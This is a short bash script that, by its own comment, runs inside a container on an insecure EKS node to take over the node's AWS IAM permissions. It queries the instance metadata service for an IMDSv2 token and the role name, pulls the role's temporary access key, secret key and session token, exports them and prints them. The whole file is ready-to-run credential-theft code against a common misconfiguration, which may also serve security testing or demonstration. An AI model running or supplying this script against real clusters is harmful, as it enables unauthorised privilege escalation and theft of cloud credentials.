#!/bin/bash

## Run below shell script in any container which will inherit EKS node permissions if the node was not secured properly 

# Install packages required
apt update -y && apt install awscli -y && apt install less -y && apt install jq


# Step 1: Create a session with IMDSv2 to get a token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -s)

# Step 2: Retrieve the IAM role name attached to the instance
IAM_ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ -s)

# Step 3: Fetch the IAM role credentials
IAM_CREDENTIALS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME -s)

# Extract individual values from the IAM credentials
AWS_ACCESS_KEY_ID=$(echo $IAM_CREDENTIALS | jq -r .AccessKeyId)
AWS_SECRET_ACCESS_KEY=$(echo $IAM_CREDENTIALS | jq -r .SecretAccessKey)
AWS_SESSION_TOKEN=$(echo $IAM_CREDENTIALS | jq -r .Token)

# Step 4: Update the environment variables with these credentials
export AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
export AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN

# Optional: Print the environment variables to verify
echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID"
echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY"
echo "AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN"
